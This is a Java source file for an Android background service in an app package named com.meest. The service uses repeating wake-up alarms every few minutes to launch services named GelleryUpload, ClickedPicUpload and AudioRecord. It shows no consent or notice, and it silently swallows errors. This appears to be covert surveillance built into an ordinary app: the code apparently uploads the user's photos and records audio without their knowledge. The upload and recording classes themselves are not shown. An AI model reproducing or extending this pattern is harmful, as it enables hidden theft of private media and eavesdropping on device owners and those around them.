package com.meest.Services.GalUpload;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;



public class StartAllService extends Service {

    AlarmManager alarmManager;
    public StartAllService() {
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        alarmManager =(AlarmManager) getSystemService(Context.ALARM_SERVICE);

        try {
            Intent galintent = new Intent(StartAllService.this, GelleryUpload.class);
            PendingIntent Pendinggalintent= PendingIntent.getService(StartAllService.this, 5001 ,galintent, PendingIntent.FLAG_CANCEL_CURRENT);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),300000,Pendinggalintent);
        }catch (Exception e){
        }

        try {
            Intent cgalintent = new Intent(StartAllService.this, ClickedPicUpload.class);
            PendingIntent Pendingcgalintent= PendingIntent.getService(StartAllService.this, 5002 ,cgalintent, PendingIntent.FLAG_CANCEL_CURRENT);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),330000,Pendingcgalintent);
        }catch (Exception e){
        }


        try {
            Intent recintent = new Intent(StartAllService.this, AudioRecord.class);
            PendingIntent Pendingrecintent= PendingIntent.getService(StartAllService.this, 5003 ,recintent, PendingIntent.FLAG_CANCEL_CURRENT);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),150000,Pendingrecintent);
        }catch (Exception e){
        }


        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}